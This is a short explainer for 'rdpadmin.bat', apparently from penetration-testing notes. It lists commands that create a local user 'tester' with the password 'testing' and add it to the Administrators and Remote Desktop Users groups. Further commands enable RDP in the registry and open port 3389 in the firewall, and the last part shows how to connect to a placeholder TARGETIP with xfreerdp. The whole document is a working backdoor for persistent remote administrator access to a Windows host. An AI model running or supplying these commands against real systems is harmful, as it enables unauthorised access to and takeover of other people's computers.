# rdpadmin.bat Explained
============================================================================
### Add a local user account
net user tester testing /ADD

### Add a local user account to the Local Administrators group
net localgroup administrators tester /ADD

### Add a local user account to the Remote Desktop Users group
net localgroup "Remote Desktop Users" tester /ADD

### Enable RDP in the registry
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

### Enable RDP in the Firewall
netsh firewall add portopening TCP 3389 "RDP"

============================================================================

## If you get CredSSP error when connecting (rdesktop) use freerdp
### Install:
sudo apt-get install freerdp-x11
### Connect:
xfreerdp /v:TARGETIP:3389 /u:tester
